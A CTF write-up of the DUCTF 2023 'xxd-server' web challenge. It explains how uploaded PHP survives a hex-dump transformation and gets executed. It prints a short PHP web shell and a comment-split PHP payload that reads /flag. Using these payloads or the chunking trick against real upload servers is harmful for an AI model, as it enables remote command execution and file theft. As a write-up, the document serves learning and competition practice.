# xxd-server

## Challenge description

XXD server is the last beginner challenge from the web category and for me it was harder than the rest.

It's a php server where you upload a file and it gets transformed to hex encoding with the original text to the side.

The files .htaccess and the docker file basically make it so that only the php files are executed and every other type of file gets dealt with as a text/plain.

Now with that being said and taking into account that I'm pretty new to CTFing and mostly a dumbass in general it shouldn't come as a surprise that I came up with the stupidest possible solution to this challenge which after talking to a friend I realised was an unintended solution.

The intended solution taking into account you can have a php file with no problems if it's less than 16 characters is probably something like this:

```php
<?=`$_GET[0]`;
```

Which is a web shell that's less than 16 characters.

Now without further ado, my solution “The scenic route”:

## The scenic route

My first attempt was to do the usual 

```php
<?php phpinfo() ?>
```

But that didn't work, there was an unexpected integer in the way, a new line had started so the payload breaks. So I got the gist and changed to the intended easier solution, Right? Wrong, let's go even dumber!

A good way to get over the problem of having undesired characters in the middle is just using multiline comments /**/, everything in the middle gets nullified and php goes merely on its way, so this works:

```php
<?php /*        */phpinfo()/*  */?>
```

### He'll surely realise eventually

In this case I had to split it in 3 because phpinfo() is 9 characters and you need 4 free characters for opening and closing comments, now that that worked the plan was to use this payload to get the job done:

```php

<?php $c=fopen("/flag","r");echo fread($c,filesize("/flag"));>
```

It didn't use file_get_contents() because it was literally too long, but this should work just as well, it just needed to get modified a tad bit to be able to execute under the non optimal working conditions…

### He did in fact, not realise

After some extreme modifications this is the ugly thing I ended up with:

```php

<?php $b="r";/* */$a= "/flag";/**/$c=         /**/fopen($a,$b)/**/;$d=fread($c/**/,filesize($a/**/)); echo $d?>
```

But it did work.

![flag_xxd-server.png](https://github.com/Thomy-G/CTF-Writeups/blob/main/DUCTF%202023/flag_xxd-server.png)

After I found out that my solve was overly complicated I decided that I had no option but commit to the extreme stupidity and make a tool out of it so sooner or later I'll release a CLI tool to turn PHP into chunks that can live separated from each other also splitting function names based on a writeup I saw online and still execute. It was a fun experience even if unintendedly so.

Thanks for reading
